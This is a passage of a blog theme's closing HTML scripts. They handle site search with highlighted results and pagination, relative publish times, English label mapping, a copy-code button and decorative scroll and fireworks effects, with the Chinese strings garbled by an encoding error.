    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + 'ç§’ä¹‹å‰';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + 'åˆ†é’Ÿä¹‹å‰';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + 'å°æ—¶ä¹‹å‰';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + 'å¤©ä¹‹å‰';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }
  //æ‹¿æ¥ä¸»ä¹‰(çœŸé¦™)^_^ï¼ŒClipboard å®ç°æ‘˜è‡ªæ˜é‡‘ https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // åˆ¤æ–­æ˜¯ä¸æ˜¯iosç«¯
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //åˆ›å»ºæ–‡æœ¬å…ƒç´ 
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //é€‰æ‹©å†…å®¹
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //å¤åˆ¶åˆ°å‰ªè´´æ¿
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("å¤åˆ¶é”™è¯¯ï¼è¯·æ‰‹åŠ¨å¤åˆ¶ï¼")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === 'å¤åˆ¶æˆåŠŸ') {
        return;
      }
      e.srcElement.textContent = 'å¤åˆ¶æˆåŠŸ';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === 'å¤åˆ¶æˆåŠŸ') {
            elem.textContent = 'å¤åˆ¶ä»£ç '
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = 'å¤åˆ¶ä»£ç ';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 200
  });
</script>


<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas>
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
<script type="text/javascript" src="/media/js/mouse/fireworks.js"></script>




</html>